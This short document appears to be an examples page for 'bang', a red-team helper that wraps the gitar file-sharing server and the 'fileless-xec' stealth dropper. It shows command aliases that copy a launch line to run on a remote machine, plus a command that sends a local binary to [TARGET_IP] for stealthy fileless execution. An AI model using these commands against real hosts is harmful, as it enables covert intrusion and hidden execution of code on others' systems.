# Examples

Some examples of bang usage

## `gitar`

### Share files

Start file sharing:
```
bang.gitar $AA $AP
```
This will start a `gitar` http server and copy to your clipboard a command line to run on remote. Run it, you can now upload and download file from remote easily (without further installations [see](https://github.com/ariary/gitar/blob/main/README.md#tldr---and-listen-music)). 

### Share files safely

Same as above + inside a container + using https for encryption

Start safe file sharing:
```
bang.gitar-safe $AA $AP
```

## `fileless-xec`

### Copy line to launch `fieleless-xec` stealth dropper

This will copy command line on your clipboard to launch fileless-xec on remote. (Previously, uploaded it to the remote machine)

```
bang.flxscpy
```

### Send a local file to remote `fileless-xec` to stealrthy run it

This will send a local binary to a remote listening `fileless-xec`. The binary will be then executed (stealthy) on remote

```
bang.flxssend [TARGET_IP]] [TARGET_PORT] [binary]
```